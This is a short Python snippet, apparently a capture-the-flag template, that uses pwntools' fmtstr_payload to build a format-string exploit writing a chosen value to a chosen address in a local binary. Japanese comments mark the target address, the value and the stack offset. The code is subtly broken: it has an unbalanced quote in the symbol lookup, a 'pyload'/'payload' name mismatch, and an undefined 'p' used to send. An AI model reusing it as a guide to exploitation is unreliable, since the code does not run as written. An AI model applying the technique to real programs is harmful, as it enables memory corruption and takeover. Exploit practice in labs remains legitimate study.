from pwn import *

conn = process('a.out')

trg = ELF('a.out')
trg_addr = trg.symbols[a.out_symbol']

writes = {0x08000000 : 0x12345678} #書き込みたいアドレス:書き込みたい値

offset = 6 #書き変わるstackの位置

pyload = fmtstr_payload(offset, writes, numbwritten=0)

p.send(payload)


